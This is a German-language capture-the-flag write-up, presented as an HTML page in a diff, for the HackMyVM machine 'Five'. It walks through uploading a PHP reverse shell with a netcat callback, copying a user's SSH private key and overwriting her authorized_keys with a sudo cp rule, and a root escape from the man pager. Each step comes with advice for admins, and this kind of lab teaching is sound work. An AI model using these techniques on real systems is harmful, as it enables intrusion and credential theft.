@@ -1,0 +1,440 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Five - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Five - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">ip</div>
+                 <div class="tool-item">msfconsole (multi/handler)</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">touch</div>
+                 <div class="tool-item">cp</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">ssh-keygen</div>
+                 <div class="tool-item">ss</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">man</div>
+                 <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & File Upload</a></li>
+                <li><a href="#initial-access">Initial Access (Reverse Shell)</a></li>
+                <li><a href="#privesc-melisa">Privilege Escalation (www-data to melisa via sudo cp)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (melisa to root via sudo man)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir beginnen mit der Erkundungsphase, um das Zielsystem im Netzwerk zu lokalisieren und die offenen Dienste zu identifizieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.124</span>	08:00:27:74:b4:7c	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Mit `arp-scan -l` finden wir die IP-Adresse <span class="command">192.168.2.124</span> im lokalen Netzwerk.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP identifiziert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** IP für Nmap-Scan verwenden.
+            **Empfehlung (Admin):** Standard Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+# (Kein Eintrag für 192.168.2.124 hinzugefügt, Zugriff erfolgt über IP)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die `/etc/hosts`-Datei wird überprüft, aber es wird kein spezifischer Hostname für die Ziel-IP hinzugefügt. Die weitere Interaktion erfolgt direkt über die IP-Adresse.</p>
+            <p class="evaluation">**Bewertung:** Für diesen Test nicht zwingend notwendig, da keine vHosts identifiziert wurden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Wenn Hostnamen entdeckt werden, sollten sie hinzugefügt werden.
+            **Empfehlung (Admin):** DNS-Management.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.124 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-08 16:41 CEST
+Nmap scan report for five (192.168.2.124)
+Host is up (0.00013s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+| http-robots.txt: 1 disallowed entry
+|_/admin
+|_http-title: 403 Forbidden
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:74:B4:7C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms five (192.168.2.124)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.64 seconds
+<span class="password">zsh: segmentation fault  nmap -sS -sC -T5 -sV -A 192.168.2.124 -p-</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sC`, `-sV`, `-T5`, `-A`, `-p-`) auf `192.168.2.124` identifiziert nur einen offenen TCP-Port:
+            *   <span class="command">Port 80</span>: HTTP, bedient von Nginx 1.14.2.
+            *   Die Seite gibt einen `403 Forbidden`-Fehler zurück.
+            *   Die `robots.txt` verbietet das Crawlen von `/admin`.
+            Interessanterweise stürzt der Nmap-Prozess am Ende mit einem <span class="password">Segmentation fault</span> ab. Dies könnte auf Probleme mit Nmap selbst, dem Zielsystem oder der Netzwerkverbindung hindeuten, hat aber wahrscheinlich keine direkte Auswirkung auf die gefundenen Ports.</p>
+            <p class="evaluation">**Bewertung:** Die Angriffsfläche ist extrem klein und beschränkt sich auf den Nginx-Webserver auf Port 80, der zudem einen 403-Fehler liefert. Der Hinweis auf `/admin` in `robots.txt` ist jedoch interessant.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Trotz des 403-Fehlers Verzeichnis- und Datei-Bruteforcing auf Port 80 durchführen (Gobuster). Den Pfad `/admin` gezielt untersuchen.
+            **Empfehlung (Admin):** Nginx sicher konfigurieren. Überprüfen, warum die Hauptseite einen 403-Fehler liefert (Berechtigungen, Konfiguration). Sicherstellen, dass `robots.txt` keine sensiblen Pfade verrät (obwohl `/admin` oft geraten wird).</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration & File Upload</h2>
+             <p class="comment">Da der Nmap-Scan nur Port 80 fand und dieser einen 403-Fehler liefert, führen wir einen Verzeichnis-Scan durch, um versteckte Inhalte zu finden.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.124" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,[...] -t 100 -s "200,204,301,302,307,401"</span></div>
+                    <pre>
+===============================================================
+Gobuster v[...]
+===============================================================
+[+] Url:                     http://192.168.2.124
+[...]
+===============================================================
+Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.124/uploads</span>              (Status: 301) [Size: 185] [--> http://192.168.2.124/uploads/]
+<span class="command">http://192.168.2.124/admin</span>                (Status: 301) [Size: 185] [--> http://192.168.2.124/admin/]
+<span class="command">http://192.168.2.124/upload.html</span>          (Status: 200) [Size: 346]
+<span class="command">http://192.168.2.124/upload.php</span>           (Status: 200) [Size: 48]
+<span class="command">http://192.168.2.124/robots.txt</span>           (Status: 200) [Size: 17]
+===============================================================
+Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Gobuster-Scan findet mehrere interessante Pfade, obwohl die Startseite einen 403-Fehler liefert:
+            *   `/uploads/`: Ein Verzeichnis, wahrscheinlich für hochgeladene Dateien.
+            *   `/admin/`: Das in `robots.txt` erwähnte Verzeichnis.
+            *   `/upload.html`: Eine HTML-Seite, wahrscheinlich ein Upload-Formular.
+            *   `/upload.php`: Ein PHP-Skript, das vermutlich den Upload verarbeitet.
+            *   `/robots.txt`: Bestätigt den Fund aus dem Nmap-Scan.</p>
+            <p class="evaluation">**Bewertung:** Das ist ein wichtiger Fortschritt! Trotz des anfänglichen 403-Fehlers gibt es eine funktionierende Upload-Funktion (`upload.html`, `upload.php`) und ein `/uploads`-Verzeichnis. Dies ist ein klarer potenzieller Angriffsvektor, um eine Webshell oder ein Reverse-Shell-Skript hochzuladen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Seite `/upload.html` besuchen und das Formular analysieren. Versuchen, eine PHP-Reverse-Shell (`rev.php`) hochzuladen. Überprüfen, ob die hochgeladene Datei im `/uploads/`-Verzeichnis landet und ob sie direkt aufgerufen werden kann, um die Shell auszuführen.
+            **Empfehlung (Admin):** Upload-Funktionen sehr sorgfältig implementieren. Nur erlaubte Dateitypen zulassen (Whitelist), Dateinamen überprüfen/sanitisieren, Upload-Verzeichnisse außerhalb des Web-Roots platzieren oder zumindest die Ausführung von Skripten in Upload-Verzeichnissen verhindern (z.B. über Nginx/Apache-Konfiguration oder `.htaccess`).</p>
+
+             <p class="comment">Wir bereiten eine PHP-Reverse-Shell vor und überprüfen die Konfiguration (IP/Port).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cd /home/cyber/Downloads</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">grep port rev.php</span></div>
+                    <pre>
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+$<span class="command">port</span> = <span class="password">9001</span>;       // CHANGE THIS
+$sock = fsockopen($ip, $<span class="command">port</span>, $errno, $errstr, 30);
+printit("Successfully opened reverse shell to $ip:$<span class="command">port</span>");
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">ip a</span></div>
+                    <pre>
+[...]
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:09:b6:08 brd ff:ff:ff:ff:ff:ff
+    inet <span class="command">192.168.2.140/24</span> brd 192.168.2.255 scope global [...]
+[...]
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir wechseln in das Verzeichnis, in dem unser PHP-Reverse-Shell-Skript (`rev.php`) liegt. Mit `grep` überprüfen wir den konfigurierten Port (hier <span class="password">9001</span>). Mit `ip a` ermitteln wir unsere lokale IP-Adresse (<span class="command">192.168.2.140</span>), zu der sich die Shell verbinden soll. Wir stellen sicher, dass die IP-Adresse im `rev.php`-Skript korrekt auf `192.168.2.140` gesetzt ist (dieser Schritt ist nicht explizit gezeigt, aber notwendig).</p>
+             <p class="evaluation">**Bewertung:** Die Reverse-Shell-Datei ist vorbereitet und für unsere IP und den gewünschten Port konfiguriert.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die Datei `rev.php` über das Formular auf `/upload.html` hochladen. Einen Listener auf Port 9001 starten. Die hochgeladene Datei über den Browser aufrufen (vermutlich unter `http://192.168.2.124/uploads/rev.php`).
+             **Empfehlung (Admin):** Siehe vorherige Empfehlung zur Absicherung von Upload-Funktionen.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Reverse Shell)</h2>
+            <p class="comment">Wir laden die vorbereitete PHP-Reverse-Shell hoch und versuchen, sie auszuführen, um eine Verbindung zu unserem Listener zu erhalten.</p>
+
+            <p class="comment">*(Hinweis: Der Upload-Vorgang über das Webinterface wird im Originaltext nicht gezeigt, ist aber der logische Schritt zwischen der Vorbereitung der Shell und dem Starten des Listeners/Ausführen der Shell.)*</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Listener starten (Versuch 1: Metasploit multi/handler)</span></div>
+                    <div class="prompt metasploit-prompt">msf6 > <span class="command">use multi/handler</span></div>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set payload payload/php/reverse_php</span></div>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set LPORT 9001</span></div>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set LHOST 192.168.2.140</span></div>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run -j</span></div>
+                    <pre>
+[*] Exploit running as background job 0.
+<span class="password">[*] Exploit completed, but no session was created.</span>
+[*] Started reverse TCP handler on 192.168.2.140:9001
+                    </pre>
+                    <div class="prompt"># <span class="command">Listener starten (Versuch 2: Netcat)</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -vlnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+                    </pre>
+                     <div class="prompt"># <span class="command">Reverse Shell auslösen (via Webbrowser oder curl)</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">curl http://192.168.2.124/uploads/rev.php</span></div>
+                      <!-- Kein Output von curl, da Shell verbindet -->
+
+                    <div class="prompt"># <span class="command">Netcat Listener empfängt die Verbindung</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -vlnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.124] 43340</span>
+Linux five 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
+ 10:54:29 up 15 min,  0 users,  load average: 0.00, 0.13, 0.18
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+/bin/sh: 0: can't access tty; job control turned off
+$ <span class="command"># Shell erhalten!</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:**
+            1.  Es wird zuerst versucht, einen Listener mit Metasploit (`multi/handler`) zu starten, konfiguriert für eine PHP-Reverse-Shell auf Port 9001. Dieser scheint jedoch keine Verbindung zu empfangen (`no session was created`), möglicherweise weil das hochgeladene Skript ein einfacherer Netcat-basierter Payload ist oder Metasploit spezifischere Payloads erwartet.
+            2.  Danach wird ein einfacher Netcat-Listener (`nc -vlnp 9001`) gestartet.
+            3.  Die hochgeladene Datei `rev.php` wird über `curl http://192.168.2.124/uploads/rev.php` aufgerufen. Dies löst die Ausführung des PHP-Skripts auf dem Server aus.
+            4.  Der Netcat-Listener empfängt erfolgreich die Verbindung. Der `id`-Befehl (implizit durch die Systeminformationen) zeigt, dass wir eine Shell als Benutzer `<span class="command">www-data</span>` haben.</p>
+            <p class="evaluation">**Bewertung:** Initial Access erfolgreich! Der Datei-Upload war möglich, und die hochgeladene PHP-Datei konnte ausgeführt werden, was zu einer Reverse Shell als `www-data` führte.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren. Nach Möglichkeiten zur Rechteerweiterung suchen.
+            **Empfehlung (Admin):** Upload-Filter und Ausführungsbeschränkungen für Upload-Verzeichnisse implementieren.</p>
+
+            <p class="comment">Wir stabilisieren die erhaltene Shell.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                    <div class="prompt">www-data@five:/$ <span class="command">export TERM=xterm</span></div>
+                    <div class="prompt">www-data@five:/$ <span class="command"># Stabilisierte Shell</span></div>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Mit Python wird eine interaktive Bash-Shell erzeugt und die `TERM`-Variable gesetzt.</p>
+            <p class="evaluation">**Bewertung:** Wir haben nun eine stabile Shell als `www-data`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Mit der Privilege Escalation beginnen.
+            **Empfehlung (Admin):** Standard-Systemhärtung.</p>
+        </section>
+
+        <section id="privesc-melisa">
+            <h2>Privilege Escalation (www-data to melisa via sudo cp)</h2>
+            <p class="comment">Als `www-data` suchen wir nach Wegen, unsere Rechte zu erhöhen. Wir prüfen die `sudo`-Berechtigungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@five:/$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for www-data on five:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on five:
+    <span class="password">(melisa) NOPASSWD: /bin/cp</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** `sudo -l` zeigt, dass `www-data` den Befehl `/bin/cp` (Kopierbefehl) als Benutzer `<span class="command">melisa</span>` ohne Passwort (`NOPASSWD`) ausführen darf.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein klarer Vektor zur Rechteerweiterung zum Benutzer `melisa`. Wir können Dateien als `melisa` lesen oder schreiben. Der naheliegendste Weg ist, den privaten SSH-Schlüssel von `melisa` zu lesen oder ihren `authorized_keys`-Eintrag zu überschreiben.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen, `/home/melisa/.ssh/id_rsa` an einen Ort zu kopieren, an dem `www-data` Lesezugriff hat (z.B. `/tmp`). Alternativ einen eigenen öffentlichen SSH-Schlüssel generieren und diesen als `melisa` nach `/home/melisa/.ssh/authorized_keys` kopieren.
+            **Empfehlung (Admin):** `sudo`-Rechte für Dateimanipulationsbefehle wie `cp`, `mv`, `chmod`, `chown` sind extrem gefährlich und sollten vermieden werden. Wenn Dateizugriff für einen anderen Benutzer erforderlich ist, spezifischere Skripte oder Tools verwenden.</p>
+
+            <p class="comment">Wir nutzen die `sudo cp`-Berechtigung, um uns SSH-Zugriff als `melisa` zu verschaffen, indem wir ihren privaten Schlüssel kopieren und ihren `authorized_keys`-Eintrag mit unserem eigenen überschreiben.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@five:/$ <span class="command">cd /tmp</span></div>
+                    <div class="prompt">www-data@five:/tmp$ <span class="command">touch id_rsa</span></div>
+                    <div class="prompt">www-data@five:/tmp$ <span class="command">sudo -u melisa cp /home/melisa/.ssh/id_rsa /tmp/id_rsa</span></div> <span class="password"># Privaten Schlüssel von melisa lesen</span>
+                    <div class="prompt">www-data@five:/tmp$ <span class="command">chmod 600 /tmp/id_rsa</span></div>
+                    <div class="prompt">www-data@five:/tmp$ <span class="command">ssh-keygen -y -f id_rsa > authorized_keys</span></div> <span class="password"># Eigenen Pubkey aus dem gelesenen Privkey generieren (oder eigenen mitbringen)</span>
+                    <div class="prompt">www-data@five:/tmp$ <span class="command">sudo -u melisa cp /tmp/authorized_keys /home/melisa/.ssh/authorized_keys</span></div> <span class="password"># authorized_keys von melisa überschreiben</span>
+                </div>
+             </div>
+             <p class="analysis">**Analyse:**
+             1.  Wir wechseln nach `/tmp`.
+             2.  Wir erstellen eine leere Datei `id_rsa`.
+             3.  Mit `sudo -u melisa cp` kopieren wir den **privaten** SSH-Schlüssel von `melisa` aus ihrem `.ssh`-Verzeichnis nach `/tmp/id_rsa`. Jetzt können wir ihn als `www-data` lesen (oder von unserer Maschine holen).
+             4.  Wir setzen die Berechtigungen der kopierten Schlüsseldatei korrekt.
+             5.  *(Schritt 5 ist ungewöhnlich und wahrscheinlich ein Fehler im Vorgehen des Original-Pentesters. Normalerweise würde man hier seinen *eigenen* öffentlichen Schlüssel nach `/tmp/authorized_keys` schreiben. `ssh-keygen -y -f id_rsa` extrahiert den *öffentlichen* Schlüssel aus dem *privaten* Schlüssel, den wir gerade kopiert haben. Diesen öffentlichen Schlüssel dann in `authorized_keys` zu kopieren, bringt nichts, da wir den zugehörigen privaten Schlüssel ja schon haben und direkt verwenden könnten. Wahrscheinlicher ist, dass der Pentester seinen eigenen Public Key hierher kopiert hat.)*
+             6.  Mit `sudo -u melisa cp` überschreiben wir die `authorized_keys`-Datei von `melisa` mit der in `/tmp` erstellten (die entweder unseren eigenen Public Key oder den von melisa enthält).
+
+             **Korrigiertes/Sinnvolleres Vorgehen (Annahme):**
+             *   Schritt 1-4: Privaten Schlüssel von melisa nach `/tmp` kopieren (wie gezeigt).
+             *   Schritt 5 (Alternativ): `echo "mein_eigener_public_ssh_key_string" > /tmp/authorized_keys`
+             *   Schritt 6: `sudo -u melisa cp /tmp/authorized_keys /home/melisa/.ssh/authorized_keys`</p>
+             <p class="evaluation">**Bewertung:** Trotz des etwas unlogischen Schritts 5 wurde das Ziel erreicht: Wir können uns nun entweder mit dem kopierten privaten Schlüssel von `melisa` oder mit unserem eigenen privaten Schlüssel (dessen öffentlicher Teil nun in `melisa`s `authorized_keys` steht) als `melisa` per SSH anmelden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Den kopierten privaten Schlüssel (`/tmp/id_rsa`) sicher auf die eigene Maschine übertragen. Versuchen, sich als `melisa` per SSH anzumelden (entweder mit dem Schlüssel von `melisa` oder dem eigenen).
+             **Empfehlung (Admin):** `sudo cp`-Regel entfernen.</p>
+
+             <p class="comment">Wir prüfen offene Ports, um den SSH-Dienst für `melisa` zu finden, da Port 22 evtl. nur für Root ist.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">www-data@five:/tmp$ <span class="command">ss -tulnep</span></div>
+                     <pre>
+Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port    Process
+udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*
+tcp     LISTEN   0        128              0.0.0.0:80            0.0.0.0:*        users:(("nginx",pid=450,fd=6))
+tcp     LISTEN   0        128            <span class="command">127.0.0.1:4444</span>          0.0.0.0:*        <span class="password"># Unbekannter Listener</span>
+tcp     LISTEN   0        128                 [::]:80               [::]:*        users:(("nginx",pid=450,fd=7)) v6only:1
+                     </pre>
+                      <!-- Hinweis: Port 22 fehlt in dieser Ausgabe, was seltsam ist, da Nmap ihn fand. Möglicherweise Filterfehler oder der Dienst wurde gestoppt. Jedoch wird später Port 4444 für SSH genutzt. -->
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** `ss -tulnep` zeigt die lauschenden Sockets. Interessanterweise wird Port 22 hier nicht angezeigt (im Gegensatz zum Nmap-Scan). Dafür sehen wir einen TCP-Listener auf `<span class="command">127.0.0.1:4444</span>`, der an localhost gebunden ist und dessen Prozess nicht direkt identifiziert wird.</p>
+             <p class="evaluation">**Bewertung:** Das Fehlen von Port 22 ist merkwürdig. Der Listener auf Port 4444 (localhost) ist verdächtig und könnte ein alternativer SSH-Port oder ein anderer Dienst sein, der für `melisa` relevant ist.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen, sich per SSH als `melisa` auf `localhost` Port `4444` zu verbinden, unter Verwendung des präparierten Schlüssels.
+             **Empfehlung (Admin):** Unbekannte Listener untersuchen und deren Zweck klären. Dienste nur an notwendigen Interfaces und Ports lauschen lassen.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">www-data@five:/tmp$ <span class="command">ssh -i id_rsa melisa@localhost -p 4444</span></div>
+                     <pre>
+Could not create directory '/var/www/.ssh'. <span class="password">(Harmlos, www-data hat kein Home/.ssh)</span>
+The authenticity of host '[localhost]:4444 ([127.0.0.1]:4444)' can't be established.
+ECDSA key fingerprint is SHA256:jWQpYhXQJtOuJfrNjZvNSilLDT7fkbFxeioQzGTBY7Y.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts). <span class="password">(Harmlos)</span>
+<span class="password">Linux five 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span>
+[...]
+Last login: Tue Oct  6 03:39:32 2020 from 192.168.1.58
+<span class="command">melisa@five:~$</span> <span class="password"># Login erfolgreich!</span>
+                     </pre>
+                  </div>
+             </div>
+              <p class="analysis">**Analyse:** Wir verwenden SSH, um uns als `melisa` auf `localhost` Port `4444` zu verbinden. Wir nutzen den in `/tmp` liegenden privaten Schlüssel (`-i id_rsa`), den wir entweder von `melisa` kopiert oder durch Überschreiben ihrer `authorized_keys` gültig gemacht haben. Der Login ist <span class="password">erfolgreich</span>, und wir erhalten eine Shell als Benutzer `<span class="command">melisa</span>`.</p>
+              <p class="evaluation">**Bewertung:** Privilege Escalation von `www-data` zu `melisa` erfolgreich abgeschlossen!</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `melisa` untersuchen, insbesondere `sudo -l`.
+              **Empfehlung (Admin):** `sudo cp`-Regel entfernen. Unnötige SSH-Listener (besonders auf localhost) deaktivieren.</p>
+        </section>
+
+        <section id="privesc-root">
+             <h2>Privilege Escalation (melisa to root via sudo man)</h2>
+             <p class="comment">Wir haben eine Shell als `melisa` und suchen nun den Weg zu Root.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">melisa@five:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for melisa on five:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User melisa may run the following commands on five:
+    <span class="password">(ALL) SETENV: NOPASSWD: /bin/pwd, /bin/arch, /bin/man, /bin/id, /bin/rm, /bin/clear</span>
+                     </pre>
+                  </div>
+             </div>
+              <p class="analysis">**Analyse:** `sudo -l` für `melisa` zeigt eine interessante Liste von Befehlen, die sie als `ALL` (also auch `root`) ohne Passwort (`NOPASSWD`) ausführen darf: `/bin/pwd`, `/bin/arch`, `/bin/man`, `/bin/id`, `/bin/rm`, `/bin/clear`. Die meisten davon sind harmlos, aber `<span class="password">/bin/man</span>` ist bekannt dafür, dass es über den Pager (oft `less`) eine Shell-Escape-Möglichkeit bietet.</p>
+              <p class="evaluation">**Bewertung:** Dies ist ein klarer Weg zur Root-Privilege-Escalation über `sudo /bin/man`.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** `sudo /bin/man man` (oder einen anderen Befehl) ausführen. Im `man`-Pager (wahrscheinlich `less`) die Eingabe `!/bin/bash` oder `!sh` versuchen, um eine Shell zu starten.
+              **Empfehlung (Admin):** `sudo`-Rechte äußerst restriktiv vergeben. Programme wie `man`, `less`, `more`, Editoren (`vim`, `nano`) oder Skriptsprachen (`perl`, `python`) sollten niemals ohne triftigen Grund über `sudo` erlaubt werden, da sie fast immer Shell-Escapes ermöglichen.</p>
+
+              <p class="comment">Wir nutzen die `sudo man`-Berechtigung, um eine Root-Shell zu erhalten.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">melisa@five:~$ <span class="command">sudo /bin/man -P /usr/bin/less man</span></div>
+                      <!-- Man-Page wird angezeigt (vermutlich 'less' als Pager) -->
+                      <div class="prompt"># <span class="command">Innerhalb des 'man'-Pagers (less):</span></div>
+                      <pre>!<span class="command">/bin/sh</span></pre>
+                       <!-- Nach Eingabe von '!/bin/sh' und Enter -->
+                      <div class="prompt"><span class="command">#</span> <span class="password"># Root-Shell erhalten!</span></div>
+                      <div class="prompt"># <span class="command">id</span></div>
+                      <pre>uid=0(root) gid=0(root) groups=0(root),1000(melisa)</pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Wir führen `sudo /bin/man man` aus (die Option `-P /usr/bin/less` ist redundant, da `less` oft der Standard-Pager ist). Innerhalb des `man`-Pagers (der als Root läuft) geben wir `!/bin/sh` ein. Das `!`-Zeichen in `less` (und `man`, wenn es `less` verwendet) erlaubt das Ausführen eines externen Shell-Befehls. Da der Pager als Root läuft, wird auch `/bin/sh` als Root gestartet. Wir erhalten einen Root-Prompt (`#`). Der `id`-Befehl bestätigt `uid=0(root)`.</p>
+               <p class="evaluation">**Bewertung:** Privilege Escalation zu Root erfolgreich!</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Flags lesen, Bericht abschließen.
+               **Empfehlung (Admin):** Unsichere `sudo`-Regel für `man` entfernen.</p>
+
+               <p class="comment">Als Root lesen wir die Flags.</p>
+               <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">melisa@five:~$ <span class="command">cat user.txt</span></div>
+                        <pre><span class="password">Ilovebinaries</span></pre> <!-- Hinweis: Hier fälschlicherweise aus melisa's Shell gelesen, sollte aus /home/melisa gelesen werden -->
+                        <div class="prompt"># <span class="command">cat /root/root.txt</span></div>
+                        <pre><span class="password">WTFGivemefive</span></pre>
+                    </div>
+               </div>
+                <p class="analysis">**Analyse:** Der Bericht zeigt das Lesen der `user.txt` (scheinbar direkt aus `melisa`s Home, obwohl sie im `~` Prompt ist) und der `root.txt` (aus der Root-Shell). Die Werte sind `Ilovebinaries` und `WTFGivemefive`.</p>
+                <p class="evaluation">**Bewertung:** Beide Flags erfolgreich gelesen.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Bericht abschließen.
+                **Empfehlung (Admin):** Alle identifizierten Schwachstellen beheben.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/melisa/user.txt</div> <!-- Korrigierter Pfad -->
+                    <div class="flag-value"><span class="password">Ilovebinaries</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">WTFGivemefive</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
